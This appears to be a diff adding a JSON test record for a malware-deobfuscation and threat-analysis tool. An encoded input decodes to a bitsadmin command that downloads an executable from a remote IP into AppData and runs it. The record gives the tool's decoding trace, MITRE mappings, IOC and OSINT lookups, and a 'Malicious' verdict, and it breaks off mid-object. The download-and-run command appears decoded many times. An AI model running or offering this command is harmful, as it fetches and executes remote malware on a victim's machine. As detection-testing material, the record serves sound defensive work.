@@ -1,0 +1,1025 @@
+{
+  "sample_id": "R2_S06_bits_b64_hex",
+  "wrap": "b64(hex(P))",
+  "input": "NjM2ZDY0MjAyZjYzMjA2MjY5NzQ3MzYxNjQ2ZDY5NmUyMDJmNzQ3MjYxNmU3MzY2NjU3MjIwNmEyMDY4NzQ3NDcwM2EyZjJmMzEzODM1MmUzMjMyMzAyZTMxMzAzMTJlMzUyZjc4MmU2NTc4NjUyMDI1NDE1MDUwNDQ0MTU0NDEyNTVjNjEyZTY1Nzg2NTIwMjYyNjIwMjU0MTUwNTA0NDQxNTQ0MTI1NWM2MTJlNjU3ODY1",
+  "input_sha1": "dd47c5b91ee224b191c81bdc1e609647c73d02e3",
+  "expected_plaintext": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+  "expected_token": "cmd",
+  "http_ms": 1845,
+  "status": 200,
+  "response": {
+    "recipe": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected"
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload"
+      },
+      {
+        "op": "env-expand",
+        "args": {},
+        "reason": "Resolved %TEMP% / $env:* / ${HOME} placeholders"
+      },
+      {
+        "op": "bitsadmin-annotate",
+        "args": {},
+        "reason": "Applied bitsadmin-annotate"
+      },
+      {
+        "op": "native-cmd-explain",
+        "args": {},
+        "reason": "Applied native-cmd-explain"
+      }
+    ],
+    "output": "# --- Bitsadmin File Transfer Detected ---\n# T1197 \u00b7 BITS Jobs \u00b7 T1105 \u00b7 Ingress Tool Transfer\n# Download URL: http://185.220.101.5/x.exe\ncmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe\n\n\u2500\u2500\u2500\u2500 NivXRay Native-Command Breakdown \u2500\u2500\u2500\u2500\nAction:        BITS-based File Transfer (LOLBAS)\nJob Name:      j\nSource URL:    http://185.220.101.5/x.exe\nTarget File:   C:\\Users\\Public\\AppData\\Roaming\\a.exe\n\nMITRE ATT&CK:  T1197 / T1105\nRisk:          Windows-signed BITS job survives reboots; auto-retries download.\nNIVX Rule ID:  BITSADMIN_TRANSFER\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      smart+archetype:LOLBAS_BITSADMIN_TRANSFER+NATIVE_CMD_EXPLAINER \u00b7 conf 100/100\n  Chain:       base64-decode \u2192 hex-decode \u2192 env-expand \u2192 bitsadmin-annotate \u2192 native-cmd-explain\n\n  MITRE ATT&CK\n    T1059.003    \u00b7 Execution\n    T1197        \u00b7 Defense Evasion\n    T1105        \u00b7 Command and Control\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       bitsadmin.exe, cmd.exe\n\n  IOCs\n    URL       http://185.220.101.5/x.exe\n    IP        185.220.101.5\n    IP        5.101.022.581\n\n  Behavior\n    1. Transfers a tool from a remote host (T1105)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: Bitsadmin file transfer (T1197 \u00b7 BITS Jobs \u00b7 T1105) \u2014 detects bitsadmin /transfer or /addfile with URL target.",
+      "Matched named wrapper archetype: Plain-text LOLBAS / native command \u2192 GoogleAI-style structured breakdown (Action/Source/Target/Flags + MITRE/Risk)."
+    ],
+    "detected_type": null,
+    "engine": "smart+archetype:LOLBAS_BITSADMIN_TRANSFER+NATIVE_CMD_EXPLAINER",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "base64-decode",
+        "args": {},
+        "reason": "Base64-encoded payload detected",
+        "output_preview": "636d64202f63206269747361646d696e202f7472616e73666572206a20687474703a2f2f3138352e3232302e3130312e352f782e657865202541505044415441255c612e657865202626202541505044415441255c612e657865",
+        "output_length": 180,
+        "evidence": {
+          "encoding": "Base64 (RFC 4648)",
+          "op": "base64-decode",
+          "length": 180,
+          "ascii": true,
+          "entropy": 3.483,
+          "hex_preview": "36 33 36 64 36 34 32 30 32 66 36 33 32 30 36 32 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "hex-decode",
+        "args": {},
+        "reason": "Hex-encoded printable payload",
+        "output_preview": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+        "output_length": 90,
+        "evidence": {
+          "encoding": "Hexadecimal ASCII",
+          "op": "hex-decode",
+          "length": 90,
+          "ascii": true,
+          "entropy": 4.725,
+          "hex_preview": "63 6d 64 20 2f 63 20 62 69 74 73 61 64 6d 69 6e \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "env-expand",
+        "args": {},
+        "reason": "Resolved %TEMP% / $env:* / ${HOME} placeholders",
+        "output_preview": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+        "output_length": 134,
+        "evidence": {
+          "encoding": "Environment-variable expansion (%TEMP%, $env:*)",
+          "op": "env-expand",
+          "length": 134,
+          "ascii": true,
+          "entropy": 4.913,
+          "hex_preview": "63 6d 64 20 2f 63 20 62 69 74 73 61 64 6d 69 6e \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "bitsadmin-annotate",
+        "args": {},
+        "reason": "Applied bitsadmin-annotate",
+        "output_preview": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+        "output_length": 134,
+        "evidence": {
+          "encoding": "bitsadmin-annotate",
+          "op": "bitsadmin-annotate",
+          "length": 134,
+          "ascii": true,
+          "entropy": 4.913,
+          "hex_preview": "63 6d 64 20 2f 63 20 62 69 74 73 61 64 6d 69 6e \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "native-cmd-explain",
+        "args": {},
+        "reason": "Applied native-cmd-explain",
+        "output_preview": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+        "output_length": 134,
+        "evidence": {
+          "encoding": "native-cmd-explain",
+          "op": "native-cmd-explain",
+          "length": 134,
+          "ascii": true,
+          "entropy": 4.913,
+          "hex_preview": "63 6d 64 20 2f 63 20 62 69 74 73 61 64 6d 69 6e \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "base64-decode",
+      "hex-decode",
+      "env-expand",
+      "bitsadmin-annotate",
+      "native-cmd-explain"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "unknown",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 40,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "batch-var-slice"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 240,
+        "length_bucket": "s",
+        "entropy": 4.452,
+        "b64_density": 1.0,
+        "has_powershell": false,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": true,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": null,
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 2,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [
+      {
+        "layer": 2,
+        "op": "hex-decode",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 3,
+        "op": "env-expand",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 4,
+        "op": "bitsadmin-annotate",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ]
+      },
+      {
+        "layer": 5,
+        "op": "native-cmd-explain",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ]
+      }
+    ],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Malicious",
+      "confidence": 90,
+      "reason": "URL surfaced in decoded output: http://185.220.101.5/x.exe.",
+      "indicators": [
+        {
+          "label": "Low entropy (5.44) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Base64 (RFC 4648) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Hexadecimal ASCII layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "Environment-variable expansion (%TEMP%, $env:*) layer peeled",
+          "kind": "neutral"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://185.220.101.5/x.exe",
+          "kind": "positive"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://185.220.101.5/x.exe",
+          "kind": "positive"
+        },
+        {
+          "label": "URL surfaced in decoded output: http://185.220.101.5/x.exe",
+          "kind": "positive"
+        }
+      ],
+      "recommended_action": "Contain source host, hunt for parent process, submit to sandbox / VirusTotal, and correlate URL / MITRE mapping."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Malicious",
+      "level": "malicious",
+      "score": 90
+    },
+    "iocs": {
+      "urls": [
+        "http://185.220.101.5/x.exe"
+      ],
+      "ips": [
+        "185.220.101.5",
+        "5.101.022.581"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1059.003",
+        "technique": "Windows Command Shell",
+        "tactic": "Execution"
+      },
+      {
+        "id": "T1197",
+        "technique": "BITS Jobs",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1105",
+        "technique": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "bitsadmin.exe",
+        "purposes": [
+          "Download",
+          "Execute"
+        ],
+        "mitre": [
+          "T1197",
+          "T1105"
+        ],
+        "description": "BITS jobs used to download and execute payloads persistently",
+        "snippet": "2MTJlNjU3ODY1 # --- Bitsadmin File Transfer Detected --- # T1197 \u00b7 BITS Jobs \u00b7 T1105 \u00b7 Ingress Tool Transfer # Download URL: http://185.220.101.5/x.exe cmd /c bitsadmin /",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+        "source": "curated"
+      },
+      {
+        "binary": "cmd.exe",
+        "purposes": [
+          "Execute"
+        ],
+        "mitre": [
+          "T1059.003"
+        ],
+        "description": "cmd.exe with /c chain or caret-obfuscation",
+        "snippet": "185.220.101.5/x.exe cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe \u2500\u2500\u2500\u2500 Niv",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "NjM2ZDY0MjAyZjYzMjA2MjY5NzQ3MzYxNjQ2ZDY5NmUyMDJmNzQ3MjYxNmU3MzY2NjU3MjIwNmEyMDY4NzQ3NDcwM2EyZjJmMzEzODM1MmUzMjMyMzAyZTMxMzAzMTJlMzUyZjc4MmU2NTc4NjUyMDI1NDE1MDUwNDQ0MTU0NDEyNTVjNjEyZTY1Nzg2NTIwMjYyNjIwMjU0MTUwNTA0NDQxNTQ0MTI1NWM2MTJlNjU3ODY1",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [
+          {
+            "id": "T1027",
+            "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+            "tactic": "Defense Evasion"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "NjM2ZDY0MjAyZjYzMjA2MjY5NzQ3MzYxNjQ2ZDY5NmUyMDJmNzQ3MjYxNmU3MzY2NjU3MjIwNmEyMDY4NzQ3NDcwM2EyZjJmMzEzODM1MmUzMjMyMzAyZTMx",
+            "description": "Long Base64 blob"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 9,
+          "band": "none"
+        }
+      },
+      {
+        "layer": 2,
+        "label": "L2 \u00b7 HEX-DECODE",
+        "op": "hex-decode",
+        "preview": "http://185.220.101.5/x.exe 185.220.101.5",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe %APPDATA%\\a.exe && %APPDATA%\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {
+          "ips": [
+            {
+              "value": "185.220.101.5",
+              "reverse_dns": "berlin01.tor-exit.artikel10.org",
+              "geo": {
+                "status": "success",
+                "country": "Germany",
+                "countryCode": "DE",
+                "regionName": "Brandenburg",
+                "city": "Brandenburg an der Havel",
+                "isp": "Stiftung Erneuerbare Freiheit",
+                "org": "Artikel10 e.V",
+                "as": "AS60729 Stiftung Erneuerbare Freiheit",
+                "mobile": false,
+                "proxy": true,
+                "hosting": false,
+                "query": "185.220.101.5"
+              },
+              "abuseipdb": {
+                "abuse_confidence_score": 100,
+                "country_code": "DE",
+                "usage_type": "Commercial",
+                "isp": "Artikel10 e.V.",
+                "total_reports": 191,
+                "last_reported_at": "2026-07-18T17:25:03+00:00",
+                "is_tor": true
+              },
+              "otx": {
+                "pulse_count": 50,
+                "reputation": 0,
+                "pulses": [
+                  {
+                    "name": "Anonymization_Network | Jun 19, 2026 | Part 1/5",
+                    "tags": [
+                      "anonymization_network"
+                    ]
+                  },
+                  {
+                    "name": "Gifted1 Live Perimeter Threat Intelligence Feed",
+                    "tags": [
+                      "Scanner",
+                      "Malicious-IP",
+                      "Threat-Intel",
+                      "Blocklist"
+                    ]
+                  },
+                  {
+                    "name": "IOC Records Provided by @NextRayAI",
+                    "tags": [
+                      "Nextray",
+                      "cyber security",
+                      "ioc",
+                      "phishing",
+                      "malicious"
+                    ]
+                  }
+                ]
+              }
+            }
+          ],
+          "domains": [],
+          "urls": [
+            {
+              "value": "http://185.220.101.5/x.exe",
+              "scheme": "http",
+              "host": "185.220.101.5",
+              "path": "/x.exe",
+              "port": null,
+              "is_onion": false,
+              "urlscan": {
+                "total": 45,
+                "results": [
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019ebf33-1b4d-7407-8250-125638bf86ea"
+                  },
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019ebf17-acf4-71ba-8a83-56fb2322ea9e"
+                  },
+                  {
+                    "url": "https://185.220.101.5/",
+                    "verdict": null,
+                    "score": null,
+                    "scan_id": "019d4324-9bb5-71a9-a047-3de5ac876352"
+                  }
+                ]
+              },
+              "otx": {
+                "pulse_count": 0,
+                "reputation": null,
+                "pulses": []
+              }
+            }
+          ],
+          "hashes": [],
+          "sources_used": [
+            "ip-api.com (geolocation, no key)",
+            "system DNS (reverse lookup, resolution)",
+            "AbuseIPDB",
+            "URLScan.io",
+            "AlienVault OTX",
+            "Hybrid Analysis"
+          ]
+        },
+        "family_hint": null,
+        "severity": {
+          "score": 43,
+          "band": "medium"
+        }
+      },
+      {
+        "layer": 3,
+        "label": "L3 \u00b7 ENV-EXPAND",
+        "op": "env-expand",
+        "preview": "http://185.220.101.5/x.exe 185.220.101.5",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 18,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 4,
+        "label": "L4 \u00b7 BITSADMIN-ANNOTATE",
+        "op": "bitsadmin-annotate",
+        "preview": "http://185.220.101.5/x.exe 185.220.101.5",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 18,
+          "band": "low"
+        }
+      },
+      {
+        "layer": 5,
+        "label": "L5 \u00b7 NATIVE-CMD-EXPLAIN",
+        "op": "native-cmd-explain",
+        "preview": "http://185.220.101.5/x.exe 185.220.101.5",
+        "iocs": {
+          "urls": [
+            "http://185.220.101.5/x.exe"
+          ],
+          "ips": [
+            "185.220.101.5"
+          ],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "bitsadmin.exe",
+            "purposes": [
+              "Download",
+              "Execute"
+            ],
+            "mitre": [
+              "T1197",
+              "T1105"
+            ],
+            "description": "BITS jobs used to download and execute payloads persistently",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/bitsadmin/",
+            "source": "curated"
+          },
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "cmd /c bitsadmin /transfer j http://185.220.101.5/x.exe C:\\Users\\Public\\AppData\\Roaming\\a.exe && C:\\Users\\Public\\AppData\\Roaming\\a.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [],
+        "yara": [],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 18,
+          "band": "low"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
